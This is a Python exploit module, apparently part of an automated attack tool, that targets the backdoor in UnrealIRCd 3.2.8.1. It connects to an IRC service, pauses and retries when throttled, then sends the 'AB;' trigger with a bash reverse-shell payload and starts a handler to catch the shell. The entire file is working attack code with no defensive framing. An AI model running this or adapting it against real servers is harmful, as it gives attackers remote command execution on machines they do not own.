#!/usr/bin/env python3

import socket
import time
import sys

def dowait():
    for i in range(0, 16):
        sys.stdout.write("\r\033[1;31m[-]\033[00m Throttled Error: pausing for %d/15 seconds\r" % i)
        sys.stdout.flush()
        time.sleep(1)
    return

def exploit(args, port, reverse_handler):
    s = socket.socket()
    s.settimeout(args.timeout)
    s.connect((args.target, port))
    ERROR_MSG = b"ERROR :Closing Link:"
    res = s.recv(1024)
    if ERROR_MSG in res:
        s.close()
        dowait()
        exploit(args, port, reverse_handler)

    print("    \033[1;32m*\033[00m Sending stage: %s:%d" % (args.target, port))
    s.send('AB;'.encode('utf-8') + reverse_handler.payload_BASH.encode('utf-8'))
    reverse_handler.start()
    print(1)

def run(args, data, reverse_handler):
    print("\033[1;34m[+]\033[00m Checking exploit: UnrealIRCD 3.2.8.1")
    for port, banner in data['services']:
        if b'irc' in banner:
            exploit(args, port, reverse_handler)
        elif b'ERROR :Closing Link:' in banner:
            time.sleep(1)
            exploit(args, port, reverse_handler)
